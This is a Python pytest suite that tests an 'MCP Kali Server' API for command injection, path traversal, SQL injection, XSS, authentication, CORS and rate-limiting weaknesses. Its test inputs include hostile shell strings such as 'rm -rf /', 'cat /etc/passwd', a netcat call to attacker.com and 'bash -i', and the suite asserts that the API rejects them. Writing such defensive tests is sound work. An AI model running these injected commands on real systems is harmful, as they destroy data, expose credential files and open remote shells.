"""
Security integration tests for MCP Kali Server.

Tests security vulnerabilities, authentication, authorization,
input validation, and protection against common attacks.
"""

import pytest
import requests
from typing import Dict, Any

from tests.fixtures.test_data import (
    generate_command_injection_attempts,
    generate_sql_injection_attempts,
    generate_xss_attempts,
    generate_path_traversal_attempts,
    TEST_CREDENTIALS
)
from tests.fixtures.mock_targets import INJECTION_ATTEMPTS


class TestCommandInjectionPrevention:
    """
    Test Case 3.1: Command Injection Prevention
    Priority: Critical

    Verify protection against command injection attacks.
    """

    @pytest.mark.critical
    @pytest.mark.security
    def test_block_semicolon_injection(self, api_client, test_config):
        """
        Verify semicolon-based command injection is blocked.

        Steps:
        1. Attempt to inject shell commands via parameters
        2. Try common injection patterns (; && || `)
        3. Verify all attempts are blocked or sanitized

        Expected Result:
        - No command injection possible
        - Appropriate error returned
        """
        malicious_targets = [
            "127.0.0.1; rm -rf /",
            "127.0.0.1; cat /etc/passwd",
            "127.0.0.1; whoami",
        ]

        for target in malicious_targets:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": target},
                timeout=test_config['timeout']
            )

            # Should either reject (400/422) or sanitize
            if response.status_code == 200:
                # If accepted, verify command was sanitized
                data = response.json()
                # Output should not contain injected command results
                output = data.get("stdout", "") + data.get("stderr", "")
                assert "root:" not in output.lower()
                assert "password" not in output.lower()
            else:
                # Should reject with client error
                assert response.status_code in [400, 422], \
                    f"Expected rejection, got {response.status_code}"

    @pytest.mark.critical
    @pytest.mark.security
    def test_block_pipe_injection(self, api_client, test_config):
        """
        Verify pipe-based command injection is blocked.
        """
        malicious_targets = [
            "127.0.0.1 | cat /etc/passwd",
            "127.0.0.1 | nc attacker.com 4444",
            "127.0.0.1 | bash -i",
        ]

        for target in malicious_targets:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": target},
                timeout=test_config['timeout']
            )

            # Should be blocked
            assert response.status_code in [400, 422], \
                f"Pipe injection not blocked for: {target}"

    @pytest.mark.critical
    @pytest.mark.security
    def test_block_backtick_injection(self, api_client, test_config):
        """
        Verify backtick command substitution is blocked.
        """
        malicious_targets = [
            "127.0.0.1`whoami`",
            "127.0.0.1`cat /etc/passwd`",
            "`id`",
        ]

        for target in malicious_targets:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": target},
                timeout=test_config['timeout']
            )

            assert response.status_code in [400, 422], \
                f"Backtick injection not blocked for: {target}"

    @pytest.mark.critical
    @pytest.mark.security
    def test_block_dollar_injection(self, api_client, test_config):
        """
        Verify $() command substitution is blocked.
        """
        malicious_targets = [
            "127.0.0.1$(whoami)",
            "$(cat /etc/passwd)",
            "127.0.0.1$(id)",
        ]

        for target in malicious_targets:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": target},
                timeout=test_config['timeout']
            )

            assert response.status_code in [400, 422], \
                f"Dollar injection not blocked for: {target}"

    @pytest.mark.critical
    @pytest.mark.security
    def test_block_logical_operators(self, api_client, test_config):
        """
        Verify logical operator injection is blocked.
        """
        malicious_targets = [
            "127.0.0.1 && whoami",
            "127.0.0.1 || echo vulnerable",
            "127.0.0.1 & sleep 10",
        ]

        for target in malicious_targets:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": target},
                timeout=test_config['timeout']
            )

            assert response.status_code in [400, 422], \
                f"Logical operator injection not blocked for: {target}"

    @pytest.mark.critical
    @pytest.mark.security
    def test_all_injection_patterns(self, api_client, test_config):
        """
        Test comprehensive list of injection patterns.
        """
        for injection_attempt in INJECTION_ATTEMPTS:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": injection_attempt},
                timeout=test_config['timeout']
            )

            # All should be blocked
            assert response.status_code in [400, 422], \
                f"Injection not blocked: {injection_attempt}"


class TestAuthenticationAuthorization:
    """
    Test Case 3.2: Authentication and Authorization
    Priority: Critical

    Test access control mechanisms.
    """

    @pytest.mark.critical
    @pytest.mark.security
    def test_unauthenticated_access_blocked(self, test_config):
        """
        Attempt to access endpoints without credentials.

        Steps:
        1. Attempt to access endpoints without credentials
        2. Try with invalid credentials
        3. Verify proper authorization for different roles

        Expected Result:
        - Unauthorized access blocked
        """
        # Create session without auth headers
        session = requests.Session()

        # Try to access protected endpoint
        response = session.post(
            f"{test_config['base_url']}/api/tools/nmap",
            json={"target": "127.0.0.1"},
            timeout=test_config['timeout']
        )

        # If auth is implemented, should return 401 or 403
        # If not implemented yet, this is a finding
        if response.status_code in [401, 403]:
            assert True, "Authentication properly enforced"
        else:
            # Document that auth is not yet implemented
            pytest.skip("Authentication not yet implemented")

    @pytest.mark.critical
    @pytest.mark.security
    def test_invalid_credentials_rejected(self, test_config):
        """
        Verify invalid credentials are rejected.
        """
        session = requests.Session()
        session.headers.update({
            "Authorization": "Bearer invalid_token_12345"
        })

        response = session.get(
            f"{test_config['base_url']}/health",
            timeout=test_config['timeout']
        )

        # If auth is required, should reject invalid token
        # Otherwise skip test
        if response.status_code in [401, 403]:
            assert True
        elif response.status_code == 200:
            pytest.skip("Authentication not required for health endpoint")

    @pytest.mark.critical
    @pytest.mark.security
    def test_api_key_validation(self, test_config):
        """
        Verify API key validation.
        """
        invalid_keys = [
            "",
            "invalid",
            "a" * 1000,  # Too long
            "../../../etc/passwd",  # Path traversal
            "'; DROP TABLE users; --",  # SQL injection
        ]

        for api_key in invalid_keys:
            session = requests.Session()
            session.headers.update({"X-API-Key": api_key})

            response = session.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": "127.0.0.1"},
                timeout=test_config['timeout']
            )

            # Should reject invalid keys
            if response.status_code in [401, 403]:
                assert True
            elif response.status_code == 200:
                pytest.skip("API key authentication not implemented")
            else:
                # Other errors are acceptable
                pass

    @pytest.mark.security
    def test_session_fixation_prevention(self, api_client, test_config):
        """
        Verify protection against session fixation.
        """
        # This would test if sessions are regenerated after login
        # Simplified test for now
        pytest.skip("Session management not implemented")

    @pytest.mark.security
    def test_csrf_protection(self, api_client, test_config):
        """
        Verify CSRF protection for state-changing operations.
        """
        # For REST APIs, CSRF is less relevant with proper auth
        # But test if implemented
        pytest.skip("CSRF testing requires session-based auth")


class TestInputValidation:
    """
    Test comprehensive input validation.

    Priority: Critical
    """

    @pytest.mark.critical
    @pytest.mark.security
    def test_null_byte_injection(self, api_client, test_config):
        """
        Verify null byte injection is prevented.
        """
        malicious_inputs = [
            "127.0.0.1\x00",
            "\x00malicious",
            "test\x00.com",
        ]

        for input_data in malicious_inputs:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": input_data},
                timeout=test_config['timeout']
            )

            # Should reject null bytes
            assert response.status_code in [400, 422], \
                "Null byte injection not blocked"

    @pytest.mark.critical
    @pytest.mark.security
    def test_path_traversal_prevention(self, api_client, test_config):
        """
        Verify path traversal attacks are blocked.
        """
        traversal_attempts = generate_path_traversal_attempts()

        for attempt in traversal_attempts:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": attempt},
                timeout=test_config['timeout']
            )

            # Should block path traversal
            assert response.status_code in [400, 422], \
                f"Path traversal not blocked: {attempt}"

    @pytest.mark.security
    def test_sql_injection_prevention(self, api_client, test_config):
        """
        Verify SQL injection attempts are blocked.
        """
        sql_injections = generate_sql_injection_attempts()

        for injection in sql_injections:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": injection},
                timeout=test_config['timeout']
            )

            # Should block SQL injection
            assert response.status_code in [400, 422], \
                f"SQL injection not blocked: {injection}"

    @pytest.mark.security
    def test_xss_prevention(self, api_client, test_config):
        """
        Verify XSS attempts are blocked or sanitized.
        """
        xss_attempts = generate_xss_attempts()

        for xss in xss_attempts:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": xss},
                timeout=test_config['timeout']
            )

            # Should block or sanitize
            if response.status_code == 200:
                data = response.json()
                output = str(data)
                # Verify script tags not in output
                assert "<script>" not in output.lower()
            else:
                assert response.status_code in [400, 422]

    @pytest.mark.security
    def test_unicode_validation(self, api_client, test_config):
        """
        Verify proper Unicode handling.
        """
        unicode_inputs = [
            "测试.com",  # Chinese
            "тест.ru",  # Cyrillic
            "🔒.com",  # Emoji
            "\u202e",  # Right-to-left override
        ]

        for unicode_input in unicode_inputs:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": unicode_input},
                timeout=test_config['timeout']
            )

            # Should handle gracefully (accept or reject cleanly)
            assert response.status_code in [200, 202, 400, 422]

    @pytest.mark.security
    def test_buffer_overflow_prevention(self, api_client, test_config):
        """
        Verify large inputs handled safely.
        """
        large_inputs = [
            "A" * 1000,
            "A" * 10000,
            "A" * 100000,
        ]

        for large_input in large_inputs:
            response = api_client.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": large_input},
                timeout=test_config['timeout']
            )

            # Should reject oversized input
            assert response.status_code in [400, 413, 422], \
                f"Large input not rejected: {len(large_input)} bytes"


class TestSecurityHeaders:
    """
    Test security-related HTTP headers.

    Priority: High
    """

    @pytest.mark.high
    @pytest.mark.security
    def test_security_headers_present(self, api_client, test_config):
        """
        Verify important security headers are present.

        Expected headers:
        - X-Content-Type-Options: nosniff
        - X-Frame-Options: DENY or SAMEORIGIN
        - X-XSS-Protection: 1; mode=block (if supported)
        - Strict-Transport-Security (for HTTPS)
        """
        response = api_client.get(f"{test_config['base_url']}/health")

        # Check for security headers (optional but recommended)
        headers = response.headers

        # Document presence of security headers
        security_headers = {
            "X-Content-Type-Options": headers.get("X-Content-Type-Options"),
            "X-Frame-Options": headers.get("X-Frame-Options"),
            "X-XSS-Protection": headers.get("X-XSS-Protection"),
        }

        # At least log what we found
        print(f"Security headers: {security_headers}")

        # This is informational - headers may not be implemented yet
        assert True

    @pytest.mark.security
    def test_no_sensitive_info_in_headers(self, api_client, test_config):
        """
        Verify no sensitive information in response headers.
        """
        response = api_client.get(f"{test_config['base_url']}/health")

        headers_str = str(response.headers).lower()

        # Should not expose version details in Server header
        sensitive_keywords = ["python", "flask", "fastapi", "uvicorn"]

        # This is informational - may need to configure server
        for keyword in sensitive_keywords:
            if keyword in headers_str:
                print(f"Warning: '{keyword}' found in headers")

    @pytest.mark.security
    def test_cors_configuration(self, api_client, test_config):
        """
        Verify CORS is properly configured.
        """
        response = api_client.options(
            f"{test_config['base_url']}/health",
            headers={"Origin": "http://evil.com"}
        )

        # Check CORS headers
        cors_headers = {
            "Access-Control-Allow-Origin": response.headers.get("Access-Control-Allow-Origin"),
            "Access-Control-Allow-Methods": response.headers.get("Access-Control-Allow-Methods"),
        }

        print(f"CORS headers: {cors_headers}")

        # CORS may not be configured - this is informational
        assert True


class TestRateLimiting:
    """
    Test rate limiting and abuse prevention.

    Priority: High
    """

    @pytest.mark.high
    @pytest.mark.security
    @pytest.mark.slow
    def test_rate_limiting_enforced(self, test_config):
        """
        Verify rate limiting is enforced.

        Expected Result:
        - Excessive requests are throttled
        - Returns 429 Too Many Requests
        """
        session = requests.Session()

        # Make many rapid requests
        rate_limit_hit = False
        for i in range(100):
            response = session.get(f"{test_config['base_url']}/health")

            if response.status_code == 429:
                rate_limit_hit = True
                break

        # If rate limiting implemented, should hit it
        if rate_limit_hit:
            assert True, "Rate limiting working"
        else:
            pytest.skip("Rate limiting not implemented")

    @pytest.mark.security
    def test_rate_limit_headers(self, api_client, test_config):
        """
        Verify rate limit headers are present.

        Expected headers:
        - X-RateLimit-Limit
        - X-RateLimit-Remaining
        - X-RateLimit-Reset
        """
        response = api_client.get(f"{test_config['base_url']}/health")

        # Check for rate limit headers
        rate_limit_headers = {
            "X-RateLimit-Limit": response.headers.get("X-RateLimit-Limit"),
            "X-RateLimit-Remaining": response.headers.get("X-RateLimit-Remaining"),
            "X-RateLimit-Reset": response.headers.get("X-RateLimit-Reset"),
        }

        print(f"Rate limit headers: {rate_limit_headers}")

        # Informational - may not be implemented
        assert True


class TestSecureDefaults:
    """
    Test that secure defaults are used.

    Priority: Medium
    """

    @pytest.mark.medium
    @pytest.mark.security
    def test_https_redirect(self, test_config):
        """
        Verify HTTP redirects to HTTPS in production.
        """
        # Only test if using HTTP
        if test_config['base_url'].startswith('http://'):
            pytest.skip("Using HTTP (test environment)")

        # For HTTPS, verify it works
        if test_config['base_url'].startswith('https://'):
            response = requests.get(f"{test_config['base_url']}/health")
            assert response.status_code == 200

    @pytest.mark.security
    def test_default_credentials_rejected(self, api_client, test_config):
        """
        Verify default credentials are not accepted.
        """
        default_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("test", "test"),
        ]

        for username, password in default_credentials:
            session = requests.Session()
            session.auth = (username, password)

            response = session.post(
                f"{test_config['base_url']}/api/tools/nmap",
                json={"target": "127.0.0.1"},
                timeout=test_config['timeout']
            )

            # Should not accept default credentials
            if response.status_code == 200:
                pytest.fail(f"Default credentials accepted: {username}:{password}")

        # If we get here, default creds were not accepted
        assert True

    @pytest.mark.security
    def test_debug_mode_disabled(self, api_client, test_config):
        """
        Verify debug mode is disabled in production.
        """
        # Try to trigger debug error page
        response = api_client.get(f"{test_config['base_url']}/nonexistent-debug-page")

        # Should not expose debug information
        if response.status_code in [404, 500]:
            body = response.text.lower()

            # Should not contain debug traces
            debug_keywords = ["traceback", "stacktrace", "exception", "debug"]

            for keyword in debug_keywords:
                if keyword in body:
                    print(f"Warning: Debug keyword '{keyword}' found in error page")

        assert True
